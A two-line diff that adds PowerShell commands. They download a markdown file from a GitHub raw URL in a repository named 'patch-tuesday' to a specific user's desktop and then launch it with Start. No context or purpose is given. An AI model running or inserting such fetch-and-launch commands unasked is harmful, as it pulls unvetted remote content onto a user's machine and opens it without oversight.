@@ -1,0 +1,2 @@
+Invoke-WebRequest https://raw.githubusercontent.com/hideinmyskill/patch-tuesday/main/Email-Notification.md -OutFile C:\Users\clark\Desktop\notif.md 
+Start C:\Users\clark\Desktop\notif.md
